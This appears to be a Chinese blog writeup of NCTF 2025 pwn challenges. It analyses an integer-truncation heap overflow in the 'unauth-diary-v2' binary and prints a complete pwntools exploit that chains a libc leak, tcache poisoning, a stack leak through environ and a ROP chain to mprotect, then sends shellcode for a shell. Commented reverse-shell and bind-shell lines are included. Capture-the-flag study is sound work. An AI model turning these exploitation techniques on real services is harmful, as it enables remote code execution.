@@ -1,0 +1,222 @@
+export const layout = "#components/Page.js";
+export const title = "NCTF2025 Writeup";
+export const description = "xxxxx";
+export const created = "2025-03-26T20:00:58+08:00";
+
+# 2025 NCTF Pwn 题解
+
+## unauth-diary-v2
+
+2.39 的菜单堆题，外面套了一层网络服务。
+
+直接分析菜单部分：
+
+
+```c
+unsigned __int64 __fastcall vuln(int a1)
+{
+  size_t v1; // rax
+  size_t v2; // rax
+  size_t v4; // rax
+  unsigned __int64 v5; // [rsp+58h] [rbp-8h]
+
+  v5 = __readfsqword(0x28u);
+  signal(13, handler);
+  while ( 1 )
+  {
+    printf("Waiting for command on fd %d\n", a1);
+    v1 = strlen(buf);
+    write(a1, buf, v1);
+    switch ( read_int(a1) )
+    {
+      case 1:
+        create(a1);
+        break;
+      case 2:
+        erase(a1);
+        break;
+      case 3:
+        modify(a1);
+        break;
+      case 4:
+        show(a1);
+        break;
+      case 5:
+        v2 = strlen("Goodbye!\n");
+        write(a1, "Goodbye!\n", v2);
+        return v5 - __readfsqword(0x28u);
+      default:
+        v4 = strlen("Invalid choice, please try again\n");
+        write(a1, "Invalid choice, please try again\n", v4);
+        break;
+    }
+  }
+}
+```
+
+题目的洞在 `create` 里：
+
+```c
+unsigned __int64 __fastcall create(int fd)
+{
+  Chunk *v1; // rbx
+  int idx; // [rsp+10h] [rbp-20h]
+  unsigned int size; // [rsp+14h] [rbp-1Ch]
+  unsigned __int64 v5; // [rsp+18h] [rbp-18h]
+
+  v5 = __readfsqword(0x28u);
+  idx = find_chunk_idx();
+  if ( idx == -1 )
+  {
+    write(fd, "No more pages can be written\n", 0x1DuLL);
+  }
+  else
+  {
+    write(fd, "Input length:\n", 0xFuLL);
+    size = read_int(fd);
+    chunk[idx] = malloc(0x10uLL);
+    if ( chunk[idx] )
+    {
+      v1 = chunk[idx];
+      v1->ptr = malloc(size + 1);
+      if ( chunk[idx]->ptr )
+      {
+        write(fd, "Input content:\n", 0xFuLL);
+        read_content(fd, chunk[idx]->ptr, size);
+        chunk[idx]->size = size + 1;
+        write(fd, "Page created\n", 0xDuLL);
+      }
+      else
+      {
+        write(fd, "Failed to allocate page 2\n", 0x1AuLL);
+      }
+    }
+    else
+    {
+      write(fd, "Failed to allocate page 1\n", 0x1AuLL);
+    }
+  }
+  return v5 - __readfsqword(0x28u);
+}
+```
+
+注意到：
+
+- `read_int` 的返回值为 `int`，`size` 是 `unsigned int`，输入 `-1` 的话返回值就是 `0xffffffff`
+- `malloc()` 的参数类型是 `size_t`，也就是 `unsigned int`
+- `chunk[idx]->size` 的类型是 `__int64`
+- `malloc(0)` 等价于 `malloc(0x10)`
+
+所以如果输入 `-1`，程序会执行 `malloc(0)`（因为 `0xffffffff + 1` 等于 `0x1 00000000`造成溢出截断)，但是 `chunk[idx]->size` 会记录 `0x1 00000000`，这就造成了无限的堆溢出。
+
+有了堆溢出之后相当于有了 UAF，可以打 tcache dup + posioning + environ 泄漏栈地址 + rop。
+
+注意这个程序外面套了一层 `socket`，所以提权的时候不能直接用 `system("/bin/sh\x00")`，得打反弹 shell。关于 pwn 中的反弹 shell 可以看[这一篇]()。
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+from sys import argv
+
+proc = "./pwn_patched"
+context.log_level = "info"
+context.binary = proc
+elf = ELF(proc, checksec=False)
+libc = ELF("./libc.so.6", checksec=False)
+# io = remote("39.106.16.204", 60706) if argv[1] == 'r' else process(proc)
+io = remote("127.0.0.1", 9999) if argv[1] == 'r' else process(proc)
+
+if args.G:
+    command = ["ps", "-ax"]
+    grep_command = ["grep", "pwn_patched"]
+    ps_process = subprocess.Popen(command, stdout=subprocess.PIPE)
+    grep_process = subprocess.Popen(grep_command, stdin=ps_process.stdout, stdout=subprocess.PIPE)
+    ps_process.stdout.close()
+    output = grep_process.communicate()[0]
+    s = output.decode()
+    pid = int(s.split("\n")[1][2:7], 10)
+    attach(pid, "breakrva 0x18f3")
+
+
+def choose(op):
+    io.sendlineafter(b"> ", str(op).encode())
+
+
+def create(length, content):
+    choose(1)
+    io.sendlineafter(b":\n", str(length).encode())
+    io.sendafter(b":\n", content)
+
+
+def delete(idx):
+    choose(2)
+    io.sendlineafter(b":\n", str(idx).encode())
+
+
+def edit(idx, content):
+    choose(3)
+    io.sendlineafter(b":\n", str(idx).encode())
+    io.sendlineafter(b":\n", content)
+
+
+def show(idx):
+    choose(4)
+    io.sendlineafter(b":\n", str(idx).encode())
+    io.recvuntil(b":\n")
+    return io.recvuntil(b"=", drop=True)
+
+
+create(0x4a0, b"a" * 0x4a0)  # 0
+create(0x20, b"a" * 0x20)
+delete(0)
+create(0x30, b"\n")
+res = show(0)
+libc_base = u64(res[:8]) - 0x203f00
+heap_addr = u64(res[24:32])
+
+environ = libc_base + 0x20ad58
+mprotect = libc_base + libc.sym['mprotect']
+system = libc_base + libc.sym['system']
+binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
+pop_rdi_ret = libc_base + 0x000000000010f75b
+pop_rsi_ret = libc_base + 0x00000000000fcf3c
+pop_rdx_or_ret = libc_base + 0x0000000000188035
+ret = libc_base + 0x000000000002882f
+log.info(f"libc_base => {hex(libc_base)}\nheap_addr => {hex(heap_addr)}")
+
+create(-1, b"\n")  # 2
+create(0x30, b"\n")  # 3
+payload = flat([b"c" * 0x10, 0, 0x21, environ, 0x31])
+edit(2, payload)
+res = show(3)
+stack_addr = u64(res[:8]) - 0x250 - 0x8
+log.info(f"stack_addr => {hex(stack_addr)}")
+
+create(-1, b"\n")  # 4
+create(0xd0, b"\n")  # 5
+create(0xd0, b"\n")  # 6
+edit(4, flat([b"d" * 0x18, 0x21, heap_addr + 0x150, 0xd1, 0, 0xe1, b"\x90" * 0xd8, 0x21, heap_addr + 0x150]))
+delete(5)
+edit(4, flat(b"d" * 0x18, 0x21, heap_addr >> 12, 0, 0, 0xe1, heap_addr >> 12, b"\x91" * 0xd0, 0x21))
+input()
+delete(6)
+# # # payload2 = flat([b"d" * 0x18, 0x21, stack_addr >> 12])
+edit(4, flat([b"d" * 0x18, 0x21, heap_addr >> 12, 0, 0, 0xe1, (heap_addr >> 12) ^ stack_addr]))
+create(0xd0, b"\n")
+# create(0x80, asm(shellcraft.dupsh(4)) + b"\n")
+payload = flat(b"A" * 8, pop_rdi_ret, (stack_addr >> 12) << 12, pop_rsi_ret, 0x1000, pop_rdx_or_ret, 7, mprotect, stack_addr + 0x48)
+# payload += asm(shellcraft.connect('127.0.0.1', 40000, 'ipv4') + shellcraft.dupsh())
+# payload += asm(shellcraft.bindsh(4444,'ipv4'))
+payload += asm(shellcraft.dupsh(4))
+create(0xd0, payload + b"\n")
+choose(5)
+io.interactive()
+```
+
+另外通过这道题目还学到了，调试这种运行起来是个 server，需要本地连接调试的 pwn 题时，可以用我 exp 里的写法。
+
+
+## unauthwarden
+
+论文题，还在看 - -
